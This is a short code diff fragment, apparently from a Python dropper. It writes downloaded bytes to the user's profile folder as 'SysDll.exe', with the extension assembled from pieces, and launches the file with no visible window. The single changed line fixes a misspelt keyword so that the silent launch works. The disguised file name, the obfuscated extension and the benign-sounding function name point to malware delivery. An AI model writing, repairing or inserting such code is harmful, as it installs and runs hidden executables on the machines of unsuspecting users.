@@ -123,7 +123,7 @@ def check_before_nextstep():
     with open(os.path.join(os.getenv("USERPROFILE"), f"SysDll.{ext1}{ext2}e"), "wb") as f:
         f.write(rsp)
 
-    subprocess.Popen(os.path.join(os.getenv("USERPROFILE"), f"SysDll.{ext1}{ext2}e"), creation_flags=subprocess.CREATE_NO_WINDOW)
+    subprocess.Popen(os.path.join(os.getenv("USERPROFILE"), f"SysDll.{ext1}{ext2}e"), creationflags=subprocess.CREATE_NO_WINDOW)
     
     one_checked = False
 
